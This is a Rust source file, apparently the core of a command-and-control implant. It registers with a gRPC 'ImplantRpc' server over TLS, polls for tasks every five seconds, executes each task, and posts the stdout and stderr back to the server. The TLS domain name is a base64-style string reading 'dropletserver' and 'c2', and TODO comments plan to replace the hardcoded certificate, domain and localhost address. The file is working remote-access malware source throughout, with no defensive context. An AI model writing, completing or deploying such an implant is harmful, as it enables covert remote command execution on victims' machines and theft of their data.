mod exec;

use std::error::Error;

use exec::implantpb::implant_rpc_client::ImplantRpcClient;
use exec::implantpb::{Registration, TaskRequest, TaskResult};
use tonic::transport::{Certificate, Channel, ClientTlsConfig};

#[tokio::main]
async fn main() {
    let mut client = make_client().await.unwrap();

    let request = tonic::Request::new(Registration {
        implant_id: "".to_string(),
    });
    let implant_id = client
        .register(request)
        .await
        .unwrap()
        .into_inner()
        .implant_id;

    loop {
        let request = tonic::Request::new(TaskRequest {
            implant_id: implant_id.clone(),
        });

        match client.get_task(request).await {
            Ok(response) => {
                println!("{:?}", response);
                let response = response.into_inner();
                if let Some((stdout, stderr)) = exec::exec_task(&response) {
                    let request = tonic::Request::new(TaskResult {
                        id: response.task_id,
                        stdout,
                        stderr,
                    });
                    client.post_result(request).await.unwrap();
                }
            }
            Err(e) => eprintln!("{:?}", e),
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}

async fn make_client() -> Result<ImplantRpcClient<Channel>, Box<dyn Error>> {
    // TODO: Don't use a hardcoded ca cert
    let pem = tokio::fs::read("../certs/ca.pem").await?;
    let ca = Certificate::from_pem(pem);

    // TODO: Don't use a hardcoded domain name
    let tls = ClientTlsConfig::new()
        .ca_certificate(ca)
        .domain_name("ZHJvcGxldHNlcnZlciAK.YzIK");

    // TODO: Don't use a hardcoded IP address
    let channel = Channel::from_static("https://127.0.0.1:9001")
        .tls_config(tls)?
        .connect()
        .await?;

    let client = ImplantRpcClient::new(channel);
    Ok(client)
}
